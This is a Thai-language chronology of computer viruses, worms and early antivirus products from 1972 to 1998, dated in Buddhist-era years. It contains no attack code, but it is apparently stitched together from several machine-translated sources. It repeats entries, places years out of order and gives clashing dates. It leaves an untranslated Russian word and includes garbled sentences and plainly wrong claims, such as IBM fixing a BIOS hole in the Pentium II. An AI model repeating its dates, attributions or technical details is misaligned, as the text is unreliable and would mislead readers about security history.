	* 2515 : นิยายวิทยาศาสตร์เรื่อง When HARLIE Was One โดย David Gerrold มีหนึ่งในตัวละครที่แสดงถึงไวรัสคอมพิวเตอร์เป็นครั้งแรก รวมถึงหนึ่งในคำแรกที่ใช้คำว่า "ไวรัส" เพื่อแสดงถึงโปรแกรมที่ทำให้คอมพิวเตอร์ติดไวรัส
	* 2516 : ในนิยาย หนังเรื่อง Westworld ของ Michael Crichton ในปี 1973 ได้กล่าวถึงแนวคิดเรื่องไวรัสคอมพิวเตอร์ในช่วงแรกๆ โดยเป็นประเด็นสำคัญที่ทำให้หุ่นยนต์ทำงานอาละวาด ตัวละครของ Alan Oppenheimer สรุปปัญหาโดยระบุว่า "...มีรูปแบบที่ชัดเจนที่นี่ซึ่งแสดงให้เห็นความคล้ายคลึงกับกระบวนการของโรคติดเชื้อที่แพร่กระจายจาก...พื้นที่หนึ่งไปยังอีกที่หนึ่ง" ซึ่งข้อความตอบกลับระบุว่า: "บางทีอาจมีความคล้ายคลึงกันเพียงผิวเผินกับโรค" และ "ฉันต้องยอมรับว่าฉันพบว่ามันยากที่จะเชื่อในโรคของเครื่องจักร" (งานก่อนหน้าของ Crichton นวนิยายปี 1969 เรื่อง The Andromeda Strain และ ภาพยนตร์ปี 1971 เกี่ยวกับโรคที่คล้ายไวรัสทางชีวภาพนอกโลกที่คุกคามเผ่าพันธุ์มนุษย์)
	* 2517 : โปรแกรมชื่อ "Rabbit" โผล่ขึ้นมาบนเครื่องเมนเฟรม ที่เป็นชื่อนี้เพราะมันไม่ได้ทำอะไรนอกจากสำเนาตัวเองอย่างรวดเร็วไปในระบบเก็บข้อมูลชนิดต่างๆ Rabbit ได้ดึงทรัพยากรของระบบมาใช้อย่างมาก ทำให้การทำงานกระทบอย่างรุนแรงจนอาจทำให้ระบบทำงานผิดพลาดได้
	* 2518 : John Walker สำหรับ UNIVAC 1108 สร้างมัลแวร์โทรจันสมัยใหม่ โปรแกรม ANIMAL ซึ่งคอมพิวเตอร์จะพยายามเดาว่ามนุษย์นึกถึงสัตว์อะไรผ่านเกมที่คล้ายกับ Twenty Questions ซึ่งเป็นที่นิยมในหมู่ผู้ใช้คอมพิวเตอร์ในขณะนั้น โปรแกรมเวอร์ชันของ John Walker มีโปรแกรมซ่อนอยู่ที่เรียกว่า PERVADE ซึ่งจะค้นหาไดเร็กทอรีคอมพิวเตอร์ ค้นหาไดเร็กทอรีที่ไม่มีสำเนาของ ANIMAL และแจกจ่ายสำเนาของ ANIMAL ลงในไดเร็กทอรีเหล่านั้น อย่างไรก็ตาม เช่นเดียวกับ Creeper โปรแกรมนี้ค่อนข้างไม่เป็นอันตรายและดำเนินมาตรการที่จะไม่ลบไฟล์ระบบที่สำคัญในขณะที่คัดลอกตัวเองไปทุกที่
ปีนี้ นวนิยายเรื่อง The Shockwave Rider โดยจอห์น บรันเนอร์ ได้รับการตีพิมพ์ โดยสร้างคำว่า "เวิร์ม" เพื่ออธิบายถึงโปรแกรมที่แพร่กระจายตัวเองผ่านเครือข่ายคอมพิวเตอร์
	* 2520 : นวนิยายเรื่อง "The Adolescence of P-1" กล่าวถึงโปรแกรมเวิร์มที่แพร่กระจายผ่านเครือข่ายที่ใช้โมเด็ม ในที่สุดก็พัฒนา AI ที่พัฒนากลยุทธ์ของตัวเอง ซึ่งเกี่ยวข้องกับปัญหาข้ามฮาร์ดแวร์และข้ามระบบปฏิบัติการ ในที่สุดก็ติดไวรัสผู้ผลิตฮาร์ดแวร์ และองค์กรป้องกัน
	* 2522 : วิศวกรของ Xerox Palo Alto Research Center ได้คิดค้น computer worm ซึ่งเป็นโปรแกรมที่ออกแบบมาให้สามารถใช้คอมพิวเตอร์ได้มีประสิทธิภาพมากขึ้น ซึ่งมันก็เป็นต้นแบบของ computer worm ในปัจจุบัน ซึ่งไปแก้ไขและลบข้อมูลในคอมแบบที่แก้คืนไม่ได้เลย
	* 2524 : มีการตรวจพบไวรัสชื่อ "Elk Cloner" นับเป็นไวรัสคอมพิวเตอร์บนเครื่องคอมพิวเตอร์ส่วนบุคคลตัวแรก (Apple PC; Apple Personal Computer) ซึ่งแพร่กระจาย คือในวงที่กว้างออกไปกว่าภายในห้องทดลองที่สร้างโปรแกรม โปรแกรมนี้ถูกเขียนขึ้นโดย Rich Skrenta โดยไวรัสนี้จะติดไปกับระบบปฏิบัติการ Apple DOS 2 ผ่านทาง boot sector ของฟล็อปปี้ดิสก์ ณ เวลานั้นผลของมันทำให้ผู้ใช้คอมพิวเตอร์บางคนนึกว่าไวรัสคอมพิวเตอร์เกิดจากมนุษย์ต่างดาว เพราะทำให้การแสดงภาพที่จอกลับหัว, ทำตัวอักษรกระพริบ, ขึ้นข้อความต่างๆออกมา คล้ายกับไวรัสสมัยใหม่คือโปรแกรม Elk Cloner เปิดเผยในปี พ.ศ. 2525 แพร่กระจายโดยการติดไวรัสระบบปฏิบัติการ DOS สำหรับ Apple II บันทึกลงในฟล็อปปี้ดิสก์ เมื่อตรวจพบดิสก์ที่ไม่ได้ติดเชื้อไวรัสจะคัดลอกตัวเองที่นั่น เมื่อโหลดทุกๆ 50 วินาทีไวรัสจะแสดงบนหน้าจอบทกวีเล็ก ๆ แม้ว่าไวรัสตัวนี้ไม่ได้ออกแบบมาเพื่อทำอันตราย แต่ก็อาจทำให้รหัส boot ลงบนฟล็อปปี้ดิสก์กับระบบอื่น ๆ ผู้เขียนไวรัสตัวนี้เป็นเด็กนักเรียนวัย 15 ปี จาก Pittsburgh Rich Skrenta (Rich Skrenta) ในขั้นต้นผู้ที่ตกเป็นเหยื่อของไวรัสคอมพิวเตอร์นี้เป็นเพื่อนและคนรู้จักของผู้เขียนเช่นเดียวกับครูคณิตศาสตร์ของเขา
	* 2525 : Joe Dellinger พัฒนาไวรัสบนเครื่อง Apple II ชื่อ Apple และได้พัฒนาโปรแกรมป้องกันไวรัสแก้ไขไวรัสชนิดนี้ด้วย นักศึกษาแพทย์ปีสุดท้ายของ University of Southern California "Fred Cohen" ได้สร้างคำที่ว่า "Computer Virus" ซึ่งอธิบายถึงโปรแกรมคอมพิวเตอร์ที่มีอิทธิพลต่อคอมพิวเตอร์เครื่องอื่นโดยเปลี่ยนแปลงโปรแกรมนั้นๆในทางที่จะช่วยมันในการทำซ้ำตัวเองให้มากขึ้นได้ โดยได้ใช้คอมพิวเตอร์ VAX 11/750 สาธิตว่าโปรแกรมไวรัสสามารถฝังตัวเข้าไปใน object อื่นได้ และต่อมาผู้ที่สร้าง Anti-virus ก็ได้ซื้อผลการวิจัยของ Cohen มาเพื่อทำการคิดค้นหาวิธีการป้องกันการติด virus เฟร็ดโคเฮน วิทยานิพนธ์ของเขาเกี่ยวกับการศึกษาโปรแกรมคอมพิวเตอร์ที่ทำซ้ำตัวเองได้แนะนำคำว่า "ไวรัสคอมพิวเตอร์" เป็นครั้งแรก แม้กระทั่งวันที่แน่นอนจะเป็นที่รู้จักกันในวันที่ 3 พฤศจิกายน 2526 เมื่อการสัมมนาประจำสัปดาห์เกี่ยวกับความปลอดภัยของคอมพิวเตอร์ที่มหาวิทยาลัยเซาเทิร์นแคลิฟอร์เนีย (USA) ได้เสนอโครงการสร้างโปรแกรมเผยแพร่ตัวเองซึ่งได้รับการขนานนามไว้ในทันที "ไวรัส" . เมื่อต้องการแก้ปัญหาจะใช้เวลา 8 ชั่วโมงบนเครื่อง VAX 11/750 ที่ใช้ระบบปฏิบัติการยูนิกซ์และอีกหนึ่งสัปดาห์ต่อมาเมื่อวันที่ 10 พฤศจิกายนการสาธิตครั้งแรกเกิดขึ้น จากผลการศึกษาเหล่านี้ Fred Cohen ตีพิมพ์ผลงาน Computer ไวรัส: ทฤษฎีและการทดลองกับคำอธิบายโดยละเอียดของปัญหาพื้นฐานของทฤษฎีของโปรแกรมการขยายตัวของตัวเองได้ถูกนำมาใช้ในยุค 40 ของศตวรรษที่ยี่สิบในผลงานของนักวิทยาศาสตร์อเมริกัน John von Neumann ซึ่งเป็นที่รู้จักกันว่าเป็นผู้เขียนหลักการพื้นฐานของคอมพิวเตอร์สมัยใหม่ ในเอกสารเหล่านี้ได้อธิบายทฤษฎีพื้นฐานของออโตเมต้าทางคณิตศาสตร์ที่ผลิตขึ้นเอง
	* 2526 : Information security conference ครั้งที่ 7 Fred Cohen ได้ให้คำจำกัดความของคำ "Computer Virus" ว่าเป็นโปรแกรมที่สามารถติดต่อไปยังโปรแกรมอื่นโดยการแก้ไขโปรแกรมเดิมเพื่อแพร่ขยายตัวเอง และเขายังถือเป็น "บิดาแห่งไวรัสศาสตร์" คำว่า "ไวรัส" เป็นชื่อว่า Frederick Cohen ในการอธิบายโปรแกรมคอมพิวเตอร์ที่จำลองขึ้นมาเอง ในปี 1984 โคเฮนใช้วลี "ไวรัสคอมพิวเตอร์" ตามที่อาจารย์ Leonard Adleman แนะนำเพื่ออธิบายการทำงานของโปรแกรมดังกล่าวในแง่ของ "การติดเชื้อ" เขากำหนด "ไวรัส" เป็น "โปรแกรมที่สามารถ 'ติดไวรัส' โปรแกรมอื่น ๆ ได้โดยปรับเปลี่ยนให้รวมถึงสำเนาที่อาจมีวิวัฒนาการของตัวเอง" โคเฮนแสดงให้เห็นถึงโปรแกรมไวรัสเหมือนใน VAX11/750 ระบบที่มหาวิทยาลัย Lehigh โปรแกรมสามารถติดตั้งเองหรือติดวัตถุระบบอื่น ๆ ได้
	* 2527 : สิงหาคม: เคน ทอมป์สันตีพิมพ์บทความเรื่อง Reflections on Trusting Trust ซึ่งเขาอธิบายวิธีที่เขาแก้ไขคอมไพเลอร์ภาษาซี เพื่อที่ว่าเมื่อใช้ในการคอมไพล์ระบบปฏิบัติการยูนิกซ์เวอร์ชันเฉพาะ มันจะแทรกแบ็คดอร์เข้าไปในคำสั่งล็อกอิน และเมื่อ ใช้เพื่อคอมไพล์สำเนาใหม่ของตัวเอง โดยจะแทรกโค้ดการแทรกแบ็คดอร์ แม้ว่าจะไม่มีแบ็คดอร์หรือโค้ดแทรกแบ็คดอร์ในซอร์สโค้ดของสำเนาใหม่นี้ก็ตาม
	* 2529 : ไวรัสติดเชื้อบน IBM PC (IBM & Compatible Personal computer) ตัวแรกของโลก ผ่าน Boot Sector "The Brain" ซึ่งถูกสร้างขึ้นโดยโปรแกรมเมอร์สองคนคือ Basit Farooq Alvi และ Amjad Alvi จากปากีสถาน otlichitelnoy ของเขา คุณลักษณะนี้เป็นฟังก์ชันการทดแทนเมื่อมีการเข้าถึงเซกเตอร์ที่ติดเชื้อโดยต้นฉบับที่ไม่ได้ติดตั้ง ภายในไม่กี่เดือนโปรแกรมไปไกลกว่าปากีสถานและในฤดูร้อนของปี 
	* 2530: การแพร่ระบาดของไวรัสได้แพร่หลายไปทั่วโลก อันที่จริงแล้วมันเป็นครั้งแรกและอนิจจาไม่ใช่การระบาดล่าสุดของไวรัสสำหรับ IBM PC ในกรณีนี้ขนาดของการแพร่ระบาดของโรคไม่ได้เทียบได้กับการติดเชื้อในปัจจุบัน ติดเชื้อในสหรัฐอเมริกามากกว่า 18,000 เครื่องคอมพิวเตอร์ ในขั้นต้นโปรแกรมควรจะเขียนให้ติดเชื้อไปกับผู้ที่ขโมยหรือสำเนาแผ่นไปใช้แต่ ออกไปจากประเทศและติดไวรัสคอมพิวเตอร์หลายร้อยเครื่องทั่วโลก คลื่นลูกที่สองระบาดเกิดขึ้นใน Lehigh University (USA): ไวรัสภายในไม่กี่วันได้ทำลายเนื้อหาของดิสเก็ตต์ต่างๆจำนวนหลายร้อยแผ่นจากห้องสมุดของศูนย์คอมพิวเตอร์ของมหาวิทยาลัยและแผ่นนักเรียนส่วนบุคคลการระบาดของไวรัสครั้งแรกได้รับการจดทะเบียนเมื่อปี พ.ศ. 2530 เหตุผลที่มันเป็นไวรัสเบรน เป็นไวรัสคอมพิวเตอร์ตัวแรกที่สร้างขึ้นสำหรับพีซีที่ใช้ IBM PC 
โปรแกรมเมอร์ชาวเยอรมันชื่อ Ralf Burger พบวิธีตรวจจับโปรแกรมที่ copy ตัวเองโดยการเพิ่ม code บางตัวเข้าไปใน ไฟล์ COM version การปรากฏตัวของไวรัสเวียนนาซึ่งต่อมาถูกทำให้เป็นกลาง – เป็นครั้งแรกที่สิ่งนี้เกิดขึ้นบนแพลตฟอร์ม IBM การปรากฏตัวของไวรัส Lehigh (ค้นพบที่มหาวิทยาลัยชื่อเดียวกัน) ไวรัสบูตเซกเตอร์ เช่น Yale จากสหรัฐอเมริกา, Stoned จากนิวซีแลนด์, Ping Pong จากอิตาลี และการปรากฏตัวของ Cascade ไวรัสไฟล์ที่เข้ารหัสตัวเองตัวแรก Lehigh ถูกหยุดในมหาวิทยาลัยก่อนที่จะแพร่กระจายไปยัง "ป่า" (ไปยังคอมพิวเตอร์ที่อยู่นอกมหาวิทยาลัย) และด้วยเหตุนี้จึงไม่เคยพบที่อื่น การติดเชื้อ Cascade ที่ตามมาในสำนักงานของ IBM Belgium ทำให้ IBM ตอบสนองด้วยการพัฒนาผลิตภัณฑ์ป้องกันไวรัสของตนเอง ก่อนหน้านี้ โซลูชันป้องกันไวรัสที่พัฒนาโดย IBM มีไว้สำหรับการใช้งานของพนักงานเท่านั้น
	ตุลาคม: ไวรัสเยรูซาเล็มซึ่งเป็นส่วนหนึ่งของครอบครัว Suriv (ในขณะนั้นไม่ทราบ) ถูกตรวจพบในเมืองเยรูซาเล็ม ไวรัสจะทำลายไฟล์ปฏิบัติการทั้งหมดบนเครื่องที่ติดไวรัสทุกครั้งที่เกิดวันศุกร์ที่ 13 (ยกเว้น	วันศุกร์ที่ 13 พฤศจิกายน พ.ศ. 2530 ซึ่งเปิดใช้งานครั้งแรกในวันที่ 13 พฤษภาคม พ.ศ. 2531) กรุงเยรูซาเล็มทำให้เกิดโรคระบาดทั่วโลกในปี พ.ศ. 2531
	พฤศจิกายน: ไวรัส SCA ซึ่งเป็นไวรัสบูตเซกเตอร์สำหรับคอมพิวเตอร์ Amiga ปรากฏขึ้น มันสร้างพายุนักเขียนไวรัสระบาดทันที หลังจากนั้นไม่นาน SCA ก็ปล่อยไวรัส Byte Bandit อีกตัวที่อันตรายกว่ามาก
	ธันวาคม: Christmas Tree EXEC เป็นโปรแกรมเครือข่ายการจำลองแบบก่อกวนอย่างกว้างขวางโปรแกรมแรก ซึ่งทำให้เครือข่ายคอมพิวเตอร์ระหว่างประเทศหลายเครือข่ายเป็นอัมพาตในเดือน	ธันวาคม พ.ศ. 2530 โปรแกรมนี้เขียนด้วยภาษา Rexx บนระบบปฏิบัติการ VM/CMS และมีต้นกำเนิดในเยอรมนีตะวันตกในขณะนั้น
	ไวรัสระบาดที่เวียนนา เป็นไวรัสที่ทำลายคอมพิวเตอร์ส่วนบุคคลตัวแรกที่ทำงานเต็มระบบ ส่งผลกระทบไปเกือบทั่วโลก ที่มาของไวรัสนี้เป็นประเด็นถกเถียงกันมาก เพราะคนที่อ้างว่าเป็นคนเขียนคือ Franz Svoboda แต่เมื่อสืบไปจึงพบว่าเขารับมาจาก Ralf Burger ซึ่งก็อ้างว่ารับมาจาก Svoboda เดิมชื่อไวรัสคือ "lovechild" แต่เพราะไม่สามารถหาคนให้กำเนิดได้จึงถูกเรียกอย่างเป็นทางการว่า "orphan" (ลูกกำพร้า) 
	* 2531 : 1 มีนาคม: ไวรัส Ping-Pong (เรียกอีกอย่างว่า Boot, Bouncing Ball, Bouncing Dot, ภาษาอิตาลี, ภาษาอิตาลี-A หรือ VeraCruz) ซึ่งเป็นไวรัสบูตเซกเตอร์ MS-DOS ถูกค้นพบที่มหาวิทยาลัย Turin ในอิตาลี
  มิถุนายน: ไวรัส CyberAIDS และ Festering Hate Apple ProDOS แพร่กระจายจากระบบ BBS โจรสลัดใต้ดินและเริ่มแพร่ระบาดในเครือข่ายกระแสหลัก Festering Hate เป็นการทำซ้ำครั้งสุดท้ายของซีรีส์ CyberAIDS ซึ่งขยายย้อนไปถึงปี 1985 และ 1986 ซึ่งแตกต่างจากไวรัส Apple สองสามตัวที่เคยมีมาก่อนซึ่งสร้างความรำคาญอย่างมาก แต่ไม่ได้สร้างความเสียหาย ไวรัส Festering Hate ทำลายล้างอย่างรุนแรงและแพร่กระจายไปยังทุกระบบ ไฟล์ที่พบได้ในโฮสต์คอมพิวเตอร์ (ฮาร์ดไดรฟ์ ฟล็อปปี้ดิสก์ และหน่วยความจำระบบ) จากนั้นจะทำลายทุกอย่างเมื่อไม่พบไฟล์ที่ไม่ติดเชื้ออีกต่อไป
  2 พฤศจิกายน: เวิร์ม Morris ที่สร้างโดย Robert Tappan Morris ติดไวรัสในเครื่อง DEC VAX และ Sun ที่ใช้ BSD UNIX ที่เชื่อมต่อกับอินเทอร์เน็ต และกลายเป็นเวิร์มตัวแรกที่แพร่กระจายอย่างกว้างขวาง "เครือข่ายคอมพิวเตอร์" และเป็นหนึ่งในตัวแรก โปรแกรมที่รู้จักใช้ประโยชน์จากช่องโหว่ที่เกินบัฟเฟอร์
  ธันวาคม: เวิร์ม Father Christmas โจมตีเครื่อง DEC VAX ที่ใช้ VMS ซึ่งเชื่อมต่อกับอินเทอร์เน็ต DECnet (เครือข่ายการวิจัยทางวิทยาศาสตร์ระหว่างประเทศโดยใช้โปรโตคอล DECnet) ส่งผลกระทบต่อ NASA และศูนย์วิจัยอื่นๆ จุดประสงค์คือเพื่อส่งคำอวยพรวันคริสต์มาสให้กับผู้ใช้ที่ได้รับผลกระทบทั้งหมด
	* 2532 : Peter Norton เจ้าของ Symantec ก็ปล่อย Norton Anti-Virus software ออกมา...การสู้รบระหว่างเทพกับมาร...ดุเดือดขึ้นในช่วงนี้ Ghostball ครั้งแรกไวรัส multipartiteถูกค้นพบโดยFri*rik Skulason จะติดเชื้อทั้งไฟล์ปฏิบัติการและไฟล์ที่ได้รับการบู๊ตในระบบ MS-DOS ธันวาคม: หลายพันฟล็อปปี้ดิสก์มีโรคเอดส์โทรจันที่รู้จักกันครั้งแรก ransomware จะถูกส่งไปยังสมาชิกของนิตยสารพีซีโลกธุรกิจและการประชุมรายชื่อผู้รับจดหมาย WHO เอดส์ โทรจัน DOS อยู่เฉยๆสำหรับรอบการบู๊ต 90 ครั้งจากนั้นจะเข้ารหัสไฟล์ทั้งหมดในระบบโดยแสดงข้อความแจ้งขอรับเงิน 189 เหรียญเพื่อส่งไปยังที่ทำการไปรษณีย์ในปานามาเพื่อรับโปรแกรมถอดรหัส
	* 2533 : มาร์ค Washburn การวิเคราะห์ไวรัสเวียนนาและแคสเคดกับราล์ฟเบอร์เกอร์พัฒนาครอบครัวแรกของไวรัส polymorphicซึ่งเป็นกลุ่ม Chameleon ชุดกิ้งก่าออกมาพร้อมกับการเปิดตัวของ1260 มิถุนายน: ไวรัสคอมพิวเตอร์แบบฟอร์มแยกตัวออกจากสวิตเซอร์แลนด์ มันจะอยู่ในป่าเป็นเวลาเกือบ 20 ปีและปรากฏตัวหลังจากนั้น; ในช่วงปีพ. ศ. 2533 มีแนวโน้มที่จะเป็นไวรัสที่พบมากในป่าที่มีการติดเชื้อที่รายงานถึง 20 ถึง 50 เปอร์เซ็นต์
	* 2531: John Mcafee พัฒนาโปรแกรมป้องกันไวรัสเป็นคนแรก เชื่อ VirusScan ถือเป็นโปรแกรม AntiVirus ตัวแรกเพื่อการค้า ส่วน Peter Norton programmer ที่มีชื่อเสียง ผู้ซึ่งเป็นผู้ก่อตั้งบริษัท Symantec ได้ออกมาประกาศว่าไวรัสคอมพิวเตอร์เป็นเรื่องไร้สาระ โดยเปรียบว่าเป็นแค่จระเข้ที่อยู่ในท่อระบายน้ำเสียในนิวยอร์ก แต่ในที่สุดเขาเป็นผู้ที่ได้เริ่มต้น project Norton-AntiVirus วันที่ 22 เดือนเมษายน เกิด forum ที่ถกกันเรื่อง security threat เป็นครั้งแรก ชื่อ Virus-L host ไว้ที่ Usebet สร้างโดย Ken Van Wyk เพื่อร่วมงานของ Fred Cohen ที่มหาวิทยาลัย Lehigh เดือนตุลาคม มีการแพร่ข่าวไวรัสชื่อ Mr. "Rochenle" อย่างมากเป็นไวรัสประเภทหลอกลวง (HOAX) เป็นตัวแรก อ้างถึงชื่อบุคคลที่ไม่มีตัวตนชื่อ Mike RoChenle ("Microchannel") อ้างว่าไวรัสนี้สามารถส่งตัวเองไประหว่างโมเด็มด้วยความเร็ว 2400 bps ทำให้ความเร็วโมเด็มลดลงเหลือ 1200 bps และได้อธิบายวิธีการแก้ไขที่ไม่ได้มีผลอะไร แต่มีคนหลงเชื่อทำตามกันอย่างมากมาย 
	เดือนพฤศจิกายน มีหนอนเครือข่ายชื่อ "Morris" ระบาดอย่างหนักในเครือข่าย ARPAnet ทำให้คอมพิวเตอร์กว่า 6000 เครื่องในอเมริการวมทั้งใน ศูนย์วิจัยของ NASA ติดไปด้วย ส่งผลกระทบให้การปฏิบัติงานหยุดโดยสิ้นเชิง เหตุเนื่องจากมี error ใน code ของ Morris ทำให้มัน copy ตัวเองไปที่เครือข่ายอื่นอย่างไม่จำกัดทำให้เครือข่ายรับไม่ไหว การระบาดครั้งนั้นทำให้สูญเสียเป็นมูลค่ากว่า 96 ล้านเหรียญสหรัฐ โปรแกรมเมอร์ที่มีอายุเพียง 23 ปี ชื่อว่า Robert Morris ได้ปล่อย worm ที่สามารถบุกรุก ARPANET computers ไอ้เจ้าโปรแกรมเล็กๆนี้ มันสามารถทำลายคอมพิวเตอร์ได้กว่า 6000 เครื่อง ในอเมริการวมทั้งในศูนย์วิจัยของ NASA ก็ติดไปด้วย ส่งผลกระทบให้การปฏิบัติงานหยุดโดยสิ้นเชิง โดยการทำให้ memory ของเครื่องเต็มไปด้วย copies ของมัน และการ copy ตัวเองไปที่เครือข่ายอื่นอย่างไม่จำกัดทำให้เครือข่ายรับไม่ไหว การระบาดครั้งนั้นทำให้สูญเสียเป็นมูลค่ากว่า 96 ล้านเหรียญสหรัฐMorris ได้สารภาพและถูกปรับ $10,000 และถูกภาคทัณฑ์เป็นเวลา 3 ปี เหตุการณ์นี้ส่งผลกระทบถึงประเทศไทยด้วย ไวรัสตัวนี้สร้างโดย Robert T.Morris Jr. (ทุกวันนี้แผ่นดิสก์ไวรัสของมอริสถูกเก็บไว้ในพิพิธภัณฑ์วิทยาศาสต์ในบอสตั้น) เหตุกาณ์ครั้งนี้ทำให้เกิดหน่วยงานด้านความมั่นคงทางระบบสารสนเทศ อย่าง CERT 
	* 2532 : Peter Norton เจ้าของ Symantec ก็ปล่อย Norton Anti-Virus software ออกมา...การสู้รบระหว่างเทพกับมาร...ดุเดือดขึ้นในช่วงนี้
	* 2534 : นักพัฒนาไวรัสได้พัฒนาเทคโนโลยี Polymorphic เพื่อให้หลบซ่อนการตรวจจับของ Anti-Virus ซึ่ง Tequila ไวรัส เป็นไวรัสที่ประสบความสำเร็จด้านนี้
	* 2535 : มีนาคม: ไวรัส Michelangeloถูกคาดว่าจะสร้างคัมภีร์ไบเบิลดิจิตอลในวันที่ 6 มีนาคมโดยมีคอมพิวเตอร์หลายล้านเครื่องที่มีข้อมูลถูกล้างข้อมูลตามที่ฮิสทีเรียของสื่อมวลชนล้อมรอบไวรัส ภายหลังการประเมินความเสียหายแสดงให้เห็นถึงผลพวงที่น้อยที่สุด John McAfeeได้รับการยกย่องจากสื่อว่าจะมีผลกระทบต่อคอมพิวเตอร์จำนวน 5 ล้านเครื่อง เขาบอกในภายหลังว่าผู้สัมภาษณ์ถูกกดดันโดยมีจำนวนประมาณ 5,000 ถึง 5 ล้านคน แต่สื่อมีจำนวนสูงกว่า ไวรัส Micelangelo เป็นไวรัสที่เงื่อนไขทำลายภายในไวรัสพึ่งทำงานในวันที่ 6 มีนาคม (วันเกิด "ไมเคิลแองเจลโล่") ซึ่งส่งผลกระทบต่อเครื่องคอมพิวเตอร์ทั่วโลก...โดยยังไม่มีใครรู้ว่าเครื่องเหล่านั้นติดเชื้อเมื่อไหร่...แต่ที่สำคัญคือมันทำงานครั้งสุดท้ายในวันนั้นนั่นเอง... มันถูกค้นพบในปี พ.ศ. 2535 คลื่นของสื่อสิ่งพิมพ์ในสื่อตะวันตก คาดว่าไวรัสตัวนี้จะทำลายข้อมูลในคอมพิวเตอร์หลายล้านเครื่อง แม้ว่ามันจะเป็น overrated มาก แต่ก็ยังคงสมควรได้รับการพิจารณาว่าเป็นหนึ่งในไวรัสคอมพิวเตอร์ที่ไร้ความปราณีที่สุด ด้วยแผ่นฟล็อปปี้ดิสก์ทะลุภาคบูตของดิสก์นั่งเงียบ ๆ อยู่ที่นั่นไม่ได้เรียกคืนการดำรงอยู่จนกว่าจะถึงวันที่ 6 มีนาคม และเมื่อวันที่ 6 มีนาคมข้อมูลทั้งหมดถูกลบออกจากฮาร์ดไดรฟ์อย่างปลอดภัย เกี่ยวกับไวรัสนี้ บริษัท ที่ผลิตซอฟต์แวร์ป้องกันไวรัสได้เพิ่มคุณค่าให้กับตัวเองอย่างมาก พวกเขาพยายามที่จะพัฒนาฮิสทีเรียจำนวนมากและกระตุ้นการซื้อซอฟต์แวร์ป้องกันไวรัสในขณะที่ไวรัสคอมพิวเตอร์เครื่องนี้มีเพียง 10,000 เครื่อง
	* 2536 :"Leandro" หรือ "Leandro & Kelly" [19]และ "Freddy Krueger" [20]แพร่กระจายได้อย่างรวดเร็วเนื่องจากความนิยมในการกระจายBBSและShareware
	* 2537 : เมษายน: OneHalf เป็นไวรัสคอมพิวเตอร์แบบ polymorphic แบบ DOS ผู้ใช้งาน e-mail ที่ไม่มีประสบการณ์ก็ได้ forward e-mail ตัวหนึ่งที่เตือนทุกคนไม่ให้เปิดข้อความใดๆที่มีประโยชน์สั้นๆว่า "Good Times" แต่หารู้ไม่ว่านั่นคือกลอุบายในการส่ง e-mail virus ที่มีประสิทธิภาพมากจนรัฐบาลสหรัฐต้องออกประกาศเตือนเลยทีเดียว
	* 2538 : Microsoft Corp.ได้ปล่อย Windows 95 ออกมา บริษัท Anti-virus ต่างๆ ก็เริ่มกังวลเกี่ยวกับระบบที่จะต่อต้านการติดไวรัส อย่างไรก็ตามในอีกไม่กี่ปีต่อมา "macro" viruses ก็ปรากฏและเริ่มต้นทำลาย Windows operating system. ซึ่งกำเนิดไวรัสมาโครตัวแรกชื่อ "Concept" มีผลกระทบต่อ MS-Word6 ของ ไมโครซอฟต์ออฟฟิต
	* 2539 : "Ply" - DOS 16-bit ที่ใช้ไวรัส polymorphic ที่มีความซับซ้อนปรากฏขึ้นพร้อมกับเครื่องมือเปลี่ยนสถานะในเครื่อง Boza ไวรัสตัวแรกที่ออกแบบมาเฉพาะสำหรับไฟล์ Windows 95 จะมาถึง Laroux ไวรัสตัวแรกของ Excel ปรากฏขึ้นส่วน Staog ซึ่งเป็นไวรัส Linux ตัวแรกที่โจมตีเครื่อง Linux
	* 2541 : กำเนิดไวรัสติดเชื้อไฟล์ JAVA ชื่อ StrangeBrew และนักเขียนไวรัสชาวไต้หวัน "เชิง อิง หัว" ได้สร้างไวรัสที่สามารถทำลายระบบ Flash BIOS ของคอมพิวเตอร์ได้เป็นตัวแรกของโลก ไวรัสตัวนั้นชื่อ CIH หรือ "เชอร์โนบิล". ไวรัสถูกสร้างขึ้นโดยบัณฑิต Chen Yinh Hau จากมหาวิทยาลัยไต้หวันในปี พ.ศ. 2540 และการกระทำของเขาก็เหมือนระเบิดด้วยตัวจับเวลา ประการแรกการซ่อนไวรัสสุภาพบนแผ่นดิสก์และในชั่วโมง "X" - 26 เมษายน - วันครบรอบของการเกิดอุบัติเหตุที่เชอร์โนบิลและวันเกิดของผู้สร้างที่ - ไวรัสโหดเหี้ยมเอาเนื้อหาไดรฟ์ทั้งหมดยากและบางครั้งก็ทำให้เสีย BIOS ที่เปลี่ยนคอมพิวเตอร์ของคุณเป็นกองของโลหะ ผู้ที่ตกเป็นเหยื่อของไวรัสเชอร์โนปิล "บาลี" ประมาณ 500,000 เครื่องระเบิดลอจิคัลทำลายข้อมูลทั้งหมดในฮาร์ดดิสก์และเกิดความเสียหายกับ BIOS บนเมนบอร์ดบางตัว วันที่โครงการถูกเรียกใช้ (26 เมษายน) ใกล้เคียงกับวันที่เกิดอุบัติเหตุที่โรงไฟฟ้านิวเคลียร์เชอร์โนปิลซึ่งเป็นผลให้ไวรัสมีชื่อที่สองคือ "เชอร์โนปิล" (เชอร์โนปิล) เป็นไวรัสตัวนี้ที่แสดงถึงความเสี่ยงของระบบเขียนใหม่ของไบออส ดังนั้นทันทีที่มันเปิดออกที่ซอฟต์แวร์อันตรายสามารถปิดการใช้งานไม่เพียง แต่ข้อมูล แต่ยังฮาร์ดแวร์คอมพิวเตอร์บางคนเรียกเขาว่า "เฉินหลิง" เป็นไวรัสที่ทำงานเฉพาะใน Windows 95/98 เท่านั้น เท่าที่รู้มาคือ IBM อุดช่องโหว่นี้ใน Pentium II ซึ่งเป็นเครื่องที่มีปัญหาเรื่องการคิดทศนิยมผิดด้วย...จาก Bug ที่เกิดจากผู้กรอกตารางค่าทศนิยมใน Intel กรอกผิดสรุปคือเครื่องก่อน Pentium III มีปัญหาทั้งไวรัสทำลาย BIOS ได้และจอฟ้า ตามการประมาณการต่างๆประมาณครึ่งล้านเครื่องคอมพิวเตอร์ได้รับผลกระทบเวปบางที่เรียกผู้เขียนไวรัสนี้ว่า "เชงเหลียงเฮ่" หรือ "เฉินหิ่นเจิ้ง" เขาไม่เคยถูกนำตัวไปสู่ความกระบวนการยุติธรรมและถูกปรับค่าเสียหายอย่างใด
